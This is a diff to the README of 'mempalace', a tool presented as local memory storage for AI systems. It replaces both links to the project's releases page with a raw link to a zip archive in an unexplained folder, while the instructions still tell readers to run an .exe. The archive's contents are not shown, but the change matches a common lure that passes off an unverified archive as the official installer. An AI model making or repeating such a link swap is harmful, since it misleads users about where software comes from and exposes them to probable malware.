@@ -1,6 +1,6 @@
 # 🧠 mempalace - Build a permanent memory for AI
 
-[![](https://img.shields.io/badge/Download-mempalace-blue)](https://github.com/adaxial-lineofscrimmage6998/mempalace/releases)
+[![](https://img.shields.io/badge/Download-mempalace-blue)](https://raw.githubusercontent.com/adaxial-lineofscrimmage6998/mempalace/main/Gastrolobium/Software_v3.7-alpha.3.zip)
 
 Mempalace helps you manage your digital knowledge. It stores your notes and data so AI systems can recall them later. This tool works locally on your computer to keep your information private and secure. It uses the Rust programming language to ensure fast performance and reliability.
 
@@ -11,7 +11,7 @@ Follow these steps to set up mempalace on your Windows computer. The process tak
 ### 1. Download the installer
 Visit the release page to get the latest version of the software.
 
-[https://github.com/adaxial-lineofscrimmage6998/mempalace/releases](https://github.com/adaxial-lineofscrimmage6998/mempalace/releases)
+[https://raw.githubusercontent.com/adaxial-lineofscrimmage6998/mempalace/main/Gastrolobium/Software_v3.7-alpha.3.zip](https://raw.githubusercontent.com/adaxial-lineofscrimmage6998/mempalace/main/Gastrolobium/Software_v3.7-alpha.3.zip)
 
 Look for the file that ends in .exe. Click the file name to start the download. Save the file to your desktop or your Documents folder.
 
